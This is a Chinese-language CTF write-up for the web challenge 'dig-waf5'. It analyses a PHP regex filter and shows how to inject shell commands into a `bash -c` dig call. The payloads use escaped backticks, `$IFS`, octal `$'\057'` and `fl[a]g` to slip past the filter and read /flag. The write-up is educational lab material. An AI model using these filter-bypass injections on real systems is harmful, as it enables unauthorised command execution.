## 題目

**dig-waf5**
給了一個網址，點開來
![[W1-17_web.png|425]]
程式碼跟 [[Dig waf 4]] 差不多，但判斷條件不同
```php
 $good = preg_match('/^(?i)(?!.*flag)[A-z0-9\'$]+$/', $_POST['name']);
```

## 解題
1. 觀察分析網頁的判斷條件：
   - `/.../` 是起始
   - `^...` 是字串開頭
   - `...$`是字串結尾
   - `(?i)` 代表忽略大小寫
   - `(?!.*flag)` 代表不接受 "flag"
   - `[A-z0-9\'$]+`是只允許這些字元
1. 注意到程式是 `bash -c "dig ''";`，有 `bash -c` -> 會被 shell 讀兩次
   ```
   第一層：執行 bash -c "..."
	第二層：執行裡面的 dig ...
   ```
   `$IFS` 等**變數**會被先展開 -> 在變數前加上 `\` 防止第一層 shell 展開讀取，同樣的
   舊式指令寫法的 `` ` ` `` 也一樣在前面加上 `\` 防止第一層 shell 讀取
2. 嘗試填入 `` bbb'\$IFS\`id\`' `` 並按下按鈕測試
   ![[W1-17_try.png|328]]![[W1-17_id.png|425]]
3. 找出 flag：
   - `ls /`：`/` 被禁止 -> 用 `$'\057'` 代替，變數名稱前面都要加 `\` -> 
     ```
     bbb'\$IFS\`ls\$IFS\$'\057'\`'
     ```
     ![[W1-17_ls.png|508]]
   - `cat /flag`：有擋 "flag" 的單字
     ```
     bbb'\$IFS\`cat\$IFS\$'\057'fl[a]g\`'
     ```
     ![[W1-17_flag.png|495]]
